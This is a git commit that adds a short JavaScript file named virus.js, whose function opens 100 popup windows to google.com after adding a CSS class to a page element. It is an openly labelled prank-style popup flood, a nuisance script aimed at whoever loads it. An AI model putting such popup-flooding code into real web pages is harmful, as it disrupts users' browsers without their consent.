df1c89b7f49f7bed4addb5dcd53e1e3e6e4e2ac4
Someone <98110086+B0bik228@users.noreply.github.com>
2024-08-31 22:03:56 +0300

    Add files via upload

---
+++ virus.js
@@ -0,0 +1,10 @@
+var count = 0
+function virus()
+{
+    const wow = document.getElementById('body')
+    wow.classList.add('strange')
+    for(var i = 0; i<100; i++)
+    {
+        window.open('https://www.google.com','','width=2000 height=1000');
+    }
+}
